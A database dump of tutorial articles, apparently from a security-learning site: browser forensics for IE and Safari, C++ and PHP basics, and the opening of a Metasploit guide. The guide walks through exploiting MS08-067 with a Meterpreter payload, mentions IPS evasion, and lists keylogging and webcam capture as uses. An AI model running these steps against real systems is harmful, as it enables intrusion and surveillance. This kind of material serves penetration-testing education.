msiecfexport.\r\n\r\n[code]\r\nRecord type : URL\r\nOffset range : 67968 - 68224 (256)\r\nLocation : temp:http://thepaperwall.com/wallpapers/girls/big/big_45fb5c22369e1c5d517f0282bd9250105f407e77.jpg\r\nPrimary time : Feb 05, 2013 04:26:07.030000000\r\nSecondary time : Feb 05, 2013 04:26:02.830616500\r\nFilename : big_45fb5c22369e1c5d517f0282bd9250105f407e77[1].jpg\r\nCache directory index : 1 (0x01)(OV08Z8PA)\r\n[/code]\r\n\r\nAs you see the file â€œbig_45fb5c22369e1c5d517f0282bd9250105f407e77[1].jpg\r\nâ€ is locally stored in cache directory â€œOV08Z8PAâ€. So the actual location is C:\\Users\\%username%\\AppData\\\r\nLocal\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\r\n/OV08Z8PA/big_45fb5c22369e1c5d517f0282bd9250105f407e77[1].jpg\r\n\r\nWell of course this is the file :p\r\n\r\n[img]http://thepaperwall.com/wallpapers/girls/big/big_45fb5c22369e1c5d517f0282bd9250105f407e77.jpg[/img]\r\nHere is the ouput of the cache by pasco:\r\nURL temp:http://thepaperwall.com/wallpapers/girls/big/big_45fb5c22369e1c5d517f0282bd9250105f407e77.jpg 02/04/2013 20:26:02 02/04/2013 20:26:07 big_45fb5c22369e1c5d517f0282bd9250105f407e77[1].jpg OV08Z8PA\r\n\r\nYou can again see â€œOV08Z8PAâ€ is our cache sub directory.\r\n\r\n[h2]Cookies[/h2]\r\n\r\nCookies can be found on\r\n[code]\r\nWindows XP\r\nC:\\Documents and Settings\\%username%\\ Cookies\r\n\r\n\r\nWindows Vista and 7:\r\nC:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Cookies[/code]\r\n\r\nCookies are normally in text format and we cannot understand anything.\r\n[code]\r\ns_vsn_skypeallprod_1\r\nFROM_UNIXTIME(3876974264)756\r\nskype.com/\r\n1600\r\nFROM_UNIXTIME(2798871808)\r\n31012227\r\nFROM_UNIXTIME(2587949280)\r\n30277570\r\n*\r\ns_vi\r\n[CS]v1|288542BB05010F82-4000012C80000C57[CE]\r\nskype.com/\r\n1024\r\n505403008\r\n30645652\r\nFROM_UNIXTIME(3108158896)\r\n30278524\r\n*\r\nSC\r\nCC=:CCY=:LC=en:TM=FROM_UNIXTIME(1359888053):TS=FROM_UNIXTIME(1359888053):TZ=:VER=0/6.1.0.129/272\r\nskype.com/\r\n1536\r\nFROM_UNIXTIME(1767549056)\r\n30351564\r\nFROM_UNIXTIME(3897935152)\r\n30278138\r\n*\r\n[/code]\r\n\r\nI will use a tool called [url=http://www.mcafee.com/us/downloads/free-tools/galleta.aspx]galleta[/url] which is a awesome tool release by McAfee labs.\r\n\r\n[img]http://i.imgur.com/Y7719Ww.png[/img]\r\n[code]\r\nCookie File: C:\\Users\\Osanda\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\un0wn@skype[2].txt\r\nSITE VARIABLE VALUE CREATION TIME EXPIRE TIME FLAGS\r\nskype.com/ s_vsn_skypeallprod_1 FROM_UNIXTIME(3876974264)756 Thu Jan 31 14:52:34 2013 Tue Jan 31 14:52:34 2023 1600\r\nskype.com/ s_vi [CS]v1|288542BB05010F82-4000012C80000C57[CE] Tue Feb 5 08:42:25 2013 Sun Feb 4 08:42:41 2018 1024\r\nskype.com/ SC CC=:CCY=:LC=en:TM=FROM_UNIXTIME(1359888053):TS=FROM_UNIXTIME(1359888053):TZ=:VER=0/6.1.0.129/272 Sun Feb 3 10:40:39 2013 Mon Feb 3 10:40:53 2014 1536[/code]\r\n\r\nNow you can nicely view the contents in the cookie file. \r\n\r\n[h2]Favorites[/h2]\r\nInvestigating Favorites will also be interesting in IE. By the userâ€™s bookmarks we can identify what kind of interests he owns.\r\n\r\n[code]\r\nIn windows XP\r\nC:\\Documents and Settings\\%username%\\Favorites\r\n\r\n\r\nWindows vista and 7:\r\nC:\\Users\\%username%\\FavoritesIn windows XP\r\nC:\\Documents and Settings\\%username%\\Favorites\r\n\r\nWindows vista and 7:\r\nC:\\Users\\%username%\\Favorites[/code]\r\n\r\nFavorites are in different folders by default and suppose I added google.lk to favorites we can clearly see â€œGoogle.urlâ€\r\nHere is an example:\r\n\r\n[code]\r\n[DEFAULT]\r\nBASEURL=http://www.google.lk/\r\n[{000214A0-0000-0000-C000-FROM_UNIXTIME(0000000000)46}]\r\nProp3=19,2\r\n[InternetShortcut]\r\nURL=http://www.google.lk/\r\nIDList=\r\nIconFile=http://www.google.lk/favicon.ico\r\nIconIndex=1[/code]\r\n\r\n[h2]Conclusion[/h2]\r\n\r\nEven though you erase history it wonâ€™t be deleted and is still their on the index.dat file. There are third party tools which actually erase the index.dat. But remember any file can be recovered in seconds and some third party tools leave traces. So the best would be to shred the index.dat file manually. ', 2379, 1),
(1173, 'Investigating Safari Browser', 'investigating-safari-browser', 12, 1, FROM_UNIXTIME(1365938368), '[h1]Introduction[/h1]\r\nIn Mac OS X, iOS and in many apple products store serialized objects in property list files (.plist). These file are used to store information of applications, bundles, User settings. These files are of two types namely binary property lists and XML property lists. XML plist files can be directly viewed from any program which process XML files while binary plist files should be converted to plain text for investigation.\r\nLocation of Safari Property List Files\r\nWe will be investigating the files under the following locations.\r\n[code]\r\nWindows XP:\r\nC:\\Documentsâ€‚andâ€‚Settings\\%username\\Applicationâ€‚Data\\Apple Computer\\Safari\r\nWindows Vista and 7:\r\n%appdata%\\Apple Computer\\Safari\r\nMac OS X:\r\n/Users/$username/Library/Safari\r\n[/code]\r\n\r\nI will be discussing the main objectives in the Safari Browser.\r\n[list]\r\nHistory.plist\r\nDownloads.plist\r\nBookmarks.plist\r\nCookies.binarycookies\r\ncache.db\r\n[/list]\r\n\r\nI will be using [url=http://jafat.sourceforge.net/files.html]SFT tool[/url] in all examples\r\n\r\n[h1]History.plist[/h1]\r\nThis file stores the visited URLs  along with last visited date and time, number of visits, page title.  Here is an example of my Computer.\r\n[code]\r\nURL Last Visit Date/Time Number of visits Page Title\r\nhttp://www.nytimes.com/ 2013-04-06 13:06:26 -0700 1 The New York Times - Breaking News, World News & Multimedia\r\nhttp://pastebin.com/raw.php?i=qiktzpfU 2013-04-06 13:06:16 -0700 1 http://www.hackthis.co.uk/?login 2013-04-06 13:04:23 -0700 1 HackThis!! - The Hackers Playground\r\nhttp://hackthis.co.uk/ 2013-04-06 13:04:13 -0700 1 HackThis!! - The Hackers Playground\r\nhttp://www.youtube.com/ 2013-04-06 13:03:54 -0700 1 YouTube\r\nhttp://www.wikipedia.org/ 2013-04-06 13:03:45 -0700 1 Wikipedia\r\nhttp://www.apple.com/startpage/ 2013-04-06 12:52:53 -0700 1 Apple - Start\r\n[/code]\r\n\r\n[center][img]http://i.imgur.com/PnZbW0b.png[/img][/center]\r\n\r\n[h1]Downloads.plist[/h1]\r\nThis file contains the entries of downloaded files and does not contain any cache files including images or any media. We can view this file using the SFT tool safari_downloads in this manner. This is a example from my Computer.\r\n\r\n[code]\r\nDownloadEntryProgressBytesSoFar: 5900\r\nDownloadEntryPath: C:\\Users\\Un0wn\\Downloads\\24897.rb\r\nDownloadEntryIdentifier: 59990399-A44C-CE40-B79D-07B2F99DAF66\r\nDownloadEntryURL: http://www.exploit-db.com/download/24897/ DownloadEntryPro\r\ngressTotalToLoad: 5900 Status: Completed\r\n[/code]\r\n\r\n[center][img]http://i.imgur.com/Vpfh0Ik.png[/img][/center]\r\n\r\n[h1]Bookmarks.plist[/h1]\r\nThis file contains all the saved bookmarked URLs. This file can be processed by the SFT tool sft_bm.\r\n[code]\r\nFolder Title: BookmarksBar\r\nURL_Title: Apple URL: http://\r\nwww.apple.com/\r\nURL_Title: Yahoo! URL: http://www.yahoo.com/\r\nURL_Title: Google Maps URL: http://maps.google.com/\r\nURL_Title: YouTube URL: http://www.youtube.com/\r\nURL_Title: Wikipedia URL: http://www.wikipedia.org/\r\n: Folder Title: News\r\nURL_Title: CNN URL: http://www.cnn.com/\r\nURL_Title: The New York Times URL: http://www.nytimes.com/\r\nURL_Title: Google News URL: feed://news.google.com/?output=rss\r\nURL_Title: CNET News.com URL: http://www.news.com/\r\nURL_Title: ESPN URL: http://espn.go.com/\r\nURL_Title: Los Angeles Times URL: http://www.latimes.com/\r\nURL_Title: BBC News URL: http://news.bbc.co.uk/\r\nURL_Title: NPR URL: http://www.npr.org/\r\nURL_Title: USA Today URL: http://www.usatoday.com/\r\n: Folder Title: Popular\r\nURL_Title: eBay URL: http://www.ebay.com/\r\nURL_Title: Amazon URL: http://www.amazon.com/\r\nURL_Title: Flickr URL: http://www.flickr.com/\r\nURL_Title: Expedia Travel URL: http://www.expedia.com/\r\nURL_Title: Orbitz URL: http://www.orbitz.com/\r\nURL_Title: Facebook URL: https://www.facebook.com/\r\nURL_Title: Monster Jobs URL: http://www.monster.com/\r\nURL_Title: CareerBuilder URL: http://www.careerbuilder.com/\r\nURL_Title: Disney URL: http://disney.go.com/\r\nURL_Title: craigslist URL: http://www.craigslist.org/\r\n[/code]\r\n\r\n[center][img]http://i.imgur.com/mcJ57bl.png[/img][/center]\r\n\r\n[h1]Cookies.binarycookies[/h1]\r\nThis file contains all the information related to cookies. This file can be parsed by safari_cookie_bin. This file is located inside the cookie folder in the same location. This includes the URL, the creation and expiration time, the cookie content.\r\n[code]\r\nURL Name Created Expires Path Contents\r\n.www.yahoo.com fpc 2013-04-06T16:28:48.000000Z 2014-04-06T03:56:58.000000Z / d=XMMvkO9wskhnek5BFnXSQoS5xdSWt6RrvSXAb7X6p.cXsMbbkCVttT1bp7PzRMsBgcOnrXvfttHiyOu3bFFSn_wSXgb2NzFEDSNqWKUb9YrnHaH5opWITf54YIYq6CT4Hja.fRE7RcmW5Jy0aqBKhe2RiIuCU0.q0tSl_BoX3NMi9zsbyiEAsvy7lY1xhv7eEfVQwOc-&v=2\r\n.www.yahoo.com fpms 2013-04-07T01:40:34.000000Z 2014-04-07T01:40:33.000000Z / p_30345810=%7B%22stream_filter%22%3A%22%3A%3AFROM_UNIXTIME(1365300633)674%22%7D\r\nrss.nytimes.com MF2 2013-04-06T16:30:11.000000Z 2015-04-06T03:58:23.000000Z / 1r1rot9a9a0ep\r\nwww.nytimes.com _chartbeat2 2013-04-06T20:06:41.000000Z 2013-05-06T20:06:41.000000Z / hf0zkn0xymr79ks7.FROM_UNIXTIME(1365265807)248.FROM_UNIXTIME(1365278801)138.FROM_UNIXTIME(0000000000)0001\r\nwww.nytimes.com krux_segs 2013-04-06T20:06:36.000000Z 2013-04-09T20:06:36.000000Z /\r\nwww.nytimes.com kxe_ICdF6_0U&Campaign_ID 2013-04-06T20:06:29.000000Z 2013-04-08T20:06:29.000000Z / nyt2013_163x90_digi_hp_3J3H8&Page=homepage.nytimes.com\r\n[/code]\r\n\r\n[center][img]http://i.imgur.com/sBLyceB.png[/img][/center]\r\n\r\n[h1]Cache.db[/h1]\r\nThe cache files can be easily dumped by  the SFT tool safari_wicache. This cache.db file is included the following location.\r\n[code]\r\nC:\\Users\\%username%\\AppData\\Local\\Apple Computer\\Safari[/code]\r\n\r\nsafari_wincache -f  cache.db -s C:\\cache\r\n\r\n[center][img]http://i.imgur.com/9wmsYtd.png[/img][/center]\r\nAnd further more you can use sqlite GUI to view these cache files by using this query.\r\n[code]\r\nSELECT * FROM cfurl_cache_receiver_data;[/code]\r\nFurther more if you want to learn about the safari cache.db investigating see the reference.\r\n\r\nAll property list file can be also processed by a tool called [url=https://github.com/dallarosa/plist2ota/blob/master/plutil.pl]plutil.pl[/url] by Pete M. Wilson which is a open source perl script that can convert binary plist files to a XML readable form.\r\n\r\n[h1]References[/h1]\r\n[url=http://forensicsfromthesausagefactory.blogspot.com/2010/06/safari-browser-cache-examination-of.html]http://forensicsfromthesausagefactory.blogspot.com/2010/06/safari-browser-cache-examination-of.html[/url]\r\n[url=http://jafat.sourceforge.net/Analyzing_Safari_With_SFT.pdf]http://jafat.sourceforge.net/Analyzing_Safari_With_SFT.pdf[/url]\r\n\r\nThis is the last tutorial and from this I conclude the Browser forensic Tutorial Series. Thank you for reading these and I am happy if you learned something new.\r\n\r\n[center][img]http://cdn1.iconfinder.com/data/icons/obsidianus/Macintosh%20HD.png[/img][/center]', 1070, 0),
(1174, 'C++ Basics', 'cpp-basics', 5, 1, FROM_UNIXTIME(1365937685), 'C++ is great for large performance-sensitive projects or for coding desktop applications. It''s much easier to screw up with this language, but the provided functionality and possibility  becomes quite useful for said projects. Plus, the sheer number of libraries is neat, I have barely used a tiny fraction of them myself. Just as a side note I made this to specifically to help people pass coding 1 and maybe 2 (if I have the time).\r\n\r\nFirst all normal syntax in c++ ends in ";" with exceptions of functions.\r\n\r\n[h1]Data Types[/h1]\r\nThere are many data types in c++, and the ones that you will most likely use are: \r\n[list]\r\nint - used to declare an integer variable, you can have an array of characters by declaring int NAME[length]\r\nchar - used to declare a character variable, you can have an array of characters by declaring char NAME[length]\r\nstring - used to get a bunch of chars as one variable, you can have an array of characters by declaring char NAME[length]\r\nfloat and double - used as precision integers, they can go into decimal places, arrays of them also available\r\n[/list]\r\n\r\n[h1]The int main() and Basic Headers[/h1]\r\nWhenever you write a c++ program, you should always have \r\n[code]#include <iostream>\r\nusing namespace std;[/code]\r\nThis is because they are the basic input, output, and other built in functions, without them, the program would have  no idea what you are talking about, and therefore never be able to do anything. Also, all c++ programs have this:\r\n[code]int main {\r\n     return 0;\r\n}[/code]\r\nint main is the main function of the program, and it is where the program basically starts it''s actual functioning and starts on its work.\r\n\r\n[h1]Basic Operations[/h1]\r\nFirst and foremost, you need the input and output functions, cin and cout respectively. Sample code:\r\n[code]cin >> variable;\r\ncout << variable << "Use quotes for hard-coded things" << endl;[/code]\r\nNote that you must always use ">>" for cin and "<<" for cout, and the endl at the end of the output statement creates a new line.\r\n\r\n[h2]IF and SWITCH[/h2]\r\nNow you should be ready to learn if and switch statements.\r\n[code]if(condition) {\r\n     //what happens when condition is true\r\n} else if(other condition) {\r\n     //what happens when the other condition is true\r\n} else {\r\n     //what happens when no conditions are true\r\n}\r\n\r\nswitch (expression)\r\n{\r\n  case condition:\r\n     //what happens when no conditions are true\r\n     break;\r\n  case other condition:\r\n     //what happens when no conditions are true\r\n     break;\r\n  default:\r\n     //default group of statements\r\n}[/code]\r\nThe if statement is basically saying "if this is true or this happens, this other thing in the curly brackets happen"\r\nThe switch statement is basically another type of if statement.\r\n\r\n[h2]FOR[/h2]\r\nFor loops allow you to execute a command a number of times, count, or course through an array.\r\nCode:\r\n[code]for(variable=starting_point; variable<ending_point; variable++) {\r\n     //do something each time\r\n}[/code]\r\nthe "<" before the ending_point could be changed to <=, >=, or > according to the function of the loop. Also, the ++ could be changed to += any_number, --, or -= any_number. Another thing you should keep in mind is that the "variable<ending_point" could be ignored entirely to create an infinite loop, something you might or might not want depending on what you feel like doing. An example of a for loop with int i:\r\nCode:\r\n[code]for(i=0; i<100; i++) {\r\n     cout << i << endl;\r\n}[/code]\r\nThis loop starts at 0, then goes all the way to 99 (<100), going up by 1.\r\n\r\n[h2]WHILE[/h2]\r\nNow for the while and do-while statements:\r\n[code]while (condition) {\r\n     //stuff here\r\n}\r\n\r\ndo {\r\n     //stuff here\r\n} while(condition);[/code]\r\nwhile first checks whether a condition is true, if it is, it executes the stuff and then checks if the condition is true again. The do-while statement first does the actions THEN checks if the condition is true. Now that I''ve covered pretty much the conditional statements, it time to get to the for loop, which is what you are going to use for coding 1.\r\n\r\n[h1]Hello World example[/h1]\r\n[code]#include <iostream>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    cout << "Hello World!";\r\n    return 0;\r\n}[/code]\r\n', 1431, 0),
(1192, 'PHP:OOP Part 2 - Serialization of Objects & Variable Variables', 'phpoop-serialization-of-objects-variable-variables', 5, 1, FROM_UNIXTIME(1367194381), '[h1]Serialization[/h1]\r\n[h2]Introudction[/h2]\r\nFirst off - serialization. Serialization is the conversion of objects or pieces of data into a format that is handling their type and structure and is being stored temporarily so as to called later on in the php code. Whenever the execution of the php code ends, every object is being destroyed (in some cases they are being destroyed even before that). Which actually means that every information is being erased. So in order to get the object in the state that it was at a particular time, we''d need to either, write the whole code again or just serialize the object.\r\n\r\n[img]http://i.imgur.com/DDUQiQo.png[/img]\r\n\r\nSome of the benefits you could have using serialization is:\r\n\r\n[color=#FFDAB9]A method of persisting objects[/color]\r\n- The property for storing objects and maintaining their type\r\n[color=#FFDAB9]A method for distributing objects[/color]\r\n- This is basically a module that works simultaneously with another one but they are both on located on different computers that share the same network.\r\n[color=#FFDAB9]Usage in remote procedure calls[/color]\r\n- The ability to execute a code in a range of virtual addresses sharing the same network\r\n\r\n[h2]How it works?[/h2]\r\nLet''s say we have a simple class named User.php that has two properties Name and Age & setName and setAge.\r\n\r\n[code]\r\n<?php\r\n\r\nclass User {\r\n     private $name;\r\n     private $age;\r\n\r\n     public function getName() {\r\n           return $this->name;\r\n     }\r\n     \r\n     public function setName($name) {\r\n          $this->name = $name;\r\n     }\r\n\r\n     public function getAge() {\r\n           return $this->age;\r\n     }\r\n\r\n     public function setAge($age) {\r\n          $this->age = $age;\r\n     }\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nA pretty basic class that we can append something to and call it afterwards - nothing complicated. Now let''s get an idea of a script that would append certain values to it:\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''User.php'';\r\n$a=new User();\r\n$a->setAge(20);\r\n$a->setName(''Keeper'');\r\n\r\necho $a->getName();\r\n\r\n?>\r\n[/code]\r\n\r\nWe make a new instance for the class with the first variable [color=#1E90FF]$a[/color] and define the age and name for the class we''ve included. Now let''s set some default values to the variables for name and age in our [color=#1E90FF]class User()[/color].\r\n\r\n[code]\r\n<?php\r\n\r\nclass User {\r\n     private $name=''Infamous'';\r\n     private $age=''99'';\r\n\r\n     public function getName() {\r\n           return $this->name;\r\n     }\r\n     \r\n     public function setName($name) {\r\n          $this->name = $name;\r\n     }\r\n\r\n     public function getAge() {\r\n           return $this->age;\r\n     }\r\n\r\n     public function setAge($age) {\r\n          $this->age = $age;\r\n     }\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nUpon executing [color=#32CD32]index.php[/color] which has [color=#32CD32]User.php[/color] included, we get the result ''Keeper''. So there is nothing new or awkward. The thing is that the objects are being destroyed and we get returned the last [color=#1E90FF]getName();[/color] value which is the string ''Keeper''.\r\n\r\nSo let''s actually see actually see how this goes. When we serialize an object we convert it to a string that we can manipulate in numerous ways. Afterwards, we just unserialize the string and we have returned the value of the object as it was till the time we serialized it.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''User.php'';\r\n$a=new User();\r\n$a->setAge(20);\r\n$a->setName(''Keeper'');\r\n\r\necho serialize($a);\r\n\r\n?>\r\n[/code]\r\n\r\nEchoing out the variable that hold the function, outputs this:\r\n\r\n[code]O:4:"User":2:{s:10:"Username";s:6:"Keeper";s:9:"Userage";i:20;}[/code]\r\n\r\nThat is the string value of the object. Every symbol within it has a huge importance to PHP as a whole.\r\nLet''s say we serialize it like so and append the output to a variable called $b. Now we can take that object after 5 minutes, 1 year or a decade and we will still unserialize it successfully.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''User.php'';\r\n$a=new User();\r\n$a->setAge(20);\r\n$a->setName(''Keeper'');\r\n\r\n$b = serialize($a);\r\n$c = unserialize($b);\r\n\r\necho $c->getName();\r\n\r\n?>\r\n[/code]\r\n\r\nWe get ''Keeper'' as the output. That indicates that the object has successfully been converted to a string and then again, reconverted to an object. If we get to define the value of the object like that:\r\n\r\n[code]\r\n..\r\n\r\n$c = unserialize($b);\r\n$c->setName(''Infamous'');\r\n\r\necho $c->getName();\r\n\r\n?>\r\n[/code]\r\n\r\nLogically, we get outputted the string ''Infamous''. Also another important thing to know is that the serialization doesn''t work with source code, it uses its data - not itself.\r\n\r\n[h1]Variable Variables[/h1]\r\nAs confusing as it may it seem, there is such thing. That''s the property of PHP to append the value of a variable to another variable. I''ll write the classes again and start from scratch, meanwhile I''ll be explaining everything there is to know. Subsequently, we''ll get to the variable variables, but I first wanna make sure you know what we are talking about, the concept of variable variables and how it could come in handy for a project development or whatever. We''ll write a class for a validator of a non-existent form and output default results just as a proof of concept.\r\n\r\nLet''s give it some data and define a couple of rules based on which it will validate the input. First making a method for the data that should be validated. And because we gonna use it inside of the object, let''s make a property which would be an array and the place where we''ll store the data. Also a method which will set the rules.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Validator {\r\n    \r\n    private $data=array();\r\n    private $rules=array();\r\n    public function setData($params){\r\n         $this->data=$params;\r\n    }\r\n\r\n    public function setRules($field,$type,$param){\r\n         $this->rules[$field][]=array(''type''=>$type,''param''=>$param);\r\n         return $this;\r\n    }\r\n\r\n    public function validate(){\r\n\r\n    }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nNow to the [color=#32CD32]index.php[/color] file. In it we''ll include the [color=#32CD32]Validator.php[/color], make an instance for it and set the rules for the validation. Also notice this method and the returning of itself from the upper code:\r\n\r\n[code]\r\n    public function setRules($field,$type,$param){\r\n         $this->rules[$field][]=array(''type''=>$type,''param''=>$param);\r\n         return $this;\r\n    }\r\n[/code]\r\n\r\nIt''s a method called chaining and it happens when we call a method from the same method from the same object. Okay let''s put an example to make it more clear.\r\n\r\n[code]\r\n<?php\r\n\r\n  return $this;\r\n\r\n?>\r\n[/code]\r\n\r\nNow, the idea is not to call the variable that holds the reference to the object every time. Instead of this, we call the method which calls an instance for it and so on. So the below example is that of a multiple variable defining and not the chain method.\r\n \r\n[code]\r\n<?php\r\n\r\ninclude ''Validator.php'';\r\n$v=new Validator();\r\n$v->setData(array(''username''=>''Keeper'',''pass''=>''Antagonism''));\r\n$v->setRules(''username'', ''min_length'', 4);\r\n$v->setRules(''username'', ''max_length'', 8);\r\n$v->setRules(''pass'', ''min_length'', 4);\r\n\r\n$v->validate();\r\n?>\r\n[/code]\r\n\r\nThis is an example of the chain method where we call an object and afterwards the instance for it.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Validator.php'';\r\n$v=new Validator();\r\n$v->setData(array(''username''=>''Keeper'',''pass''=>''Antagonism''));\r\n$v->setRules(''username'', ''min_length'', 4)->\r\n            setRules(''username'', ''max_length'', 8)->\r\n            setRules(''pass'', ''min_length'', 4);\r\n\r\n$v->validate();\r\n\r\n?>\r\n[/code]\r\n\r\nTechnically, there is no difference whether you write your code like so or use multiple variable defining. I personally prefer the chain method cuz it''s tidier and the code is better structured. Now let''s see what we have as the current rules we''ve applied. I''m gonna simply dump the array like so:\r\n\r\n[code]\r\n<?php\r\n\r\nclass Validator {\r\n    \r\n    private $data=array();\r\n    private $rules=array();\r\n    public function setData($params){\r\n         $this->data=$params;\r\n    }\r\n\r\n    public function setRules($field,$type,$param){\r\n         $this->rules[$field][]=array(''type''=>$type,''param''=>$param);\r\n         return $this;\r\n    }\r\n\r\n    public function validate(){\r\n          echo ''<pre>''.print_r($this->rules, true).''</pre>'';\r\n    }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nWe get this:\r\n\r\n[code]Array\r\n(\r\n    [username] => Array\r\n        (\r\n            [0] => Array\r\n                (\r\n                    [type] => min_length\r\n                    [param] => 4\r\n                )\r\n\r\n            [1] => Array\r\n                (\r\n                    [type] => min_length\r\n                    [param] => 8\r\n                )\r\n\r\n        )\r\n\r\n    [pass] => Array\r\n        (\r\n            [0] => Array\r\n                (\r\n                    [type] => min_length\r\n                    [param] => 4\r\n                )\r\n\r\n        )\r\n\r\n)[/code]\r\n\r\nIn the field of username, it has to check for a minimum length of 4 symbols and a maximum length of 8 symbols and the field for password should be just checked for the minimum length of 4. Outputting the array value gets you more aware of what we currently have as a code and the result.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Validator {\r\n    \r\n    private $data=array();\r\n    private $rules=array();\r\n    public function setData($params){\r\n         $this->data=$params;\r\n    }\r\n\r\n    public function setRules($field,$type,$param){\r\n         $this->rules[$field][]=array(''type''=>$type,''param''=>$param);\r\n         return $this;\r\n    }\r\n\r\n    public function validate(){\r\n          foreach ($this->rules as $k -> $v) {\r\n              foreach ($v as $vv) {\r\n                   if($vv[''type'']==''min_length''){\r\n                       $this->min_length($k, $vv[''param'']);\r\n                   }\r\n                   else if($vv[''type'']==''max_length''){\r\n                      $this->max_length($k, $vv[''param'']);\r\n                   }\r\n               }\r\n           }\r\n       }\r\n\r\n      private function min_length($field,$param){\r\n           if(mb_strlen($this->data[$field])>$param){      \r\n                 echo $field.'' min_length is OK<br>'';\r\n           }\r\n           else{\r\n                 echo $field.'' min_length is NOT OK<br>'';\r\n           }\r\n      }\r\n\r\n      private function max_length($field,$param){\r\n           if(mb_strlen($this->data[$field])<$param){      \r\n                 echo $field.'' max_length is OK<br>'';\r\n           }\r\n           else{\r\n           echo $field.'' max_length is NOT OK<br>'';\r\n           }\r\n      }\r\n  } \r\n\r\n?>\r\n[/code]\r\n\r\nThe first foreach() cycle holds the rules and the $k variable is the field we want to call. Now let''s make a checks for all fields. We need to create a method for each and every one of them and loop them in an if() cycle so as to perform the validation. With the first if() we check if the type of the check is minimum length, then we call the method min_length and make it accept the name of the field and what parameters it should accept. Meanwhile, with the second if() cycle we check if the length is larger than the parameter''s value and if so we return true, if not - false. We do the same for the maximum length as well. So to check whether this code is in fact functional, let''s echo an example for every check.\r\n\r\nUpon execution of this code, we get the following:\r\n\r\n[code]username min_length is OK\r\nusername max_length is NOT OK\r\npass min_length is OK[/code]\r\n\r\nNow going through our [color=#32CD32]index.php[/color] where we''ve defined our rules for the validation, we have: ''Keeper'' as username and ''Antagonism'' as password. Since the string is over 4 characters, the first check returns true. It is also true that the maximum length of the string is not exceeding 8 characters and the same goes for the password value.\r\n\r\nLet''s go about modifying the function validate() so as to be using a variable variable and to explain you how it goes.\r\n\r\n[code]\r\n<?php\r\n\r\npublic function validate(){\r\n          foreach ($this->rules as $k -> $v) {\r\n              foreach ($v as $vv) {\r\n                      $this->max_length($k, $vv[''param'']);\r\n                   }\r\n               }\r\n           }\r\n       }\r\n\r\n?>\r\n[/code]\r\n\r\nWhich is the same if we make it look like so:\r\n\r\n[code]\r\n<?php\r\n\r\npublic function validate(){\r\n          foreach ($this->rules as $k -> $v) {\r\n              foreach ($v as $vv) {\r\n\r\n                       $this->$vv[''type'']($k, $vv[''param'']);\r\n               }\r\n           }\r\n       }\r\n\r\n?>\r\n[/code]\r\n\r\nIn the first iteration, the line:\r\n\r\n[code]\r\n$this->$vv[''type'']\r\n[/code]\r\n\r\nhold the string min_length. When appending a dollar sign to it, PHP will execute the object or property with that name. Actually, we don''t even know what the variable variable is. Whenever we add a $, the variable that hold the value, that very value becomes the name of the field. So in every iteration of the script, this will go through min_length, max_length and so on.\r\n\r\nThe idea behind variable variables is that we can take the name of an object or property from a variable''s value and call it the same way.\r\n\r\n[h1]Conclusion[/h1]\r\nThis was the second tutorial from my series on object-oriented programming in PHP. It happened to be larger than I expected. Got way deeper than I should but, the more - the better. I hope at least one person reads it and gets something out of it. If anyone has any questions or issues with the class and methods, leave a reply here or PM me. [i]Thanks for reading![/i]', 759, 0),
(1208, 'Beginners Guide to Metasploit', 'a-beginners-guide-to-metasploit', 1, 1, FROM_UNIXTIME(1369689664), '[url=http://www.metasploit.com/]Metaspoilt[/url] can run on Linux, Mac OS X and on Windows. It is both a command line interface and a graphical user interface (GUI). The Metasploit Framework can be extended to use external add-ons in multiple languages making it a very powerful tool. Metasploit can be used to test the vulnerability of target systems either to protect them or to break into them. so for this reason be it legitimate or unauthorized activities, it clearly identifies the importance of security.\r\n\r\nTo exploit a system using the Metasploit Framework you carry out 5 steps:\r\n1.	Choose then configuring a pre loaded exploit in the database.\r\n2.	Check to see if the target system is susceptible to the exploit.\r\n3.	Configuring a payload\r\n4.	Encode the payload in order to hide it from an intrusion-prevention system (IPS)\r\n5.	Execute the exploit.\r\n\r\nIn order for you to choose an exploit and  a payload, information about the target is required. There are many ways to gain this information from port scanning and OS fingerprinting tools such as Nmap or vulnerability scanners such as Nessus. I''ll leave your method of information gathering up to you.\r\n\r\n[h1]Installation[/h1]\r\nInstallation of the Metasploit framework is dependant on your Operating System and hardware therefore rather than list the ways to install to save covering all eventualities I have provided a link to both windows and Linux installations:\r\n\r\nWindows: [url=https://community.rapid7.com/docs/DOC-2099]LINK...[/url]\r\nLinux : [url=https://community.rapid7.com/docs/DOC-2100]LINK...[/url]\r\n\r\nI would however highly recommend that you download Kali-Linux which comes with Metasploit Pro already installed.\r\n\r\n[h1]Usage[/h1]\r\nMetasploit is a great tool and a must have for all secutiry/penetration testers. I will show you a few ways in which metasploit can be used to exploit a target machine. (All my examples are done using Metasploit on Kali-Linux exploiting a Windows XP SP3 OS)\r\n\r\n[h2]Exploit ms08_067_netapi.[/h2]\r\nHow to connect and exploit a target machine using Metasploit Exploit ms08_067_netapi. So first of lets boot up a version of Metasploit, with the cmd msfconsole:\r\n\r\n[img]/files/media/images/articles/0/0/up_ba997f44601f2269a0a4219ef55f292e.jpg[/img]\r\nNow we need to setup our windows exploit with the following commands:\r\n1. use exploit/windows/smb/ms08_067_netapi\r\n2. set payload windows/meterpreter/bind_tcp\r\n3. set RHOST 192.168.0.10 (This IP Address will be your targets IP gained from a scan)\r\n4. exploit (This command carries out the exploit as seen below)\r\n\r\n[img]/files/media/images/articles/0/0/up_f3b11d2adba5aacddbff8d6d351dc579.jpg[/img]\r\nAll being well you should have connected to the target and carry out a number of commands. Below is the screenshot command.\r\n\r\n[img]/files/media/images/articles/0/0/up_42b5e9e1dd305310dd3e381268aee366.jpg[/img]\r\nAnd thats it  easy!!\r\n\r\nThere are loads of commands to run under this exploit, just type help and a list will be displayed.\r\nExamples are: Recording audio from microphones, screenshots from their webcam, gathering keystrokes and downloading 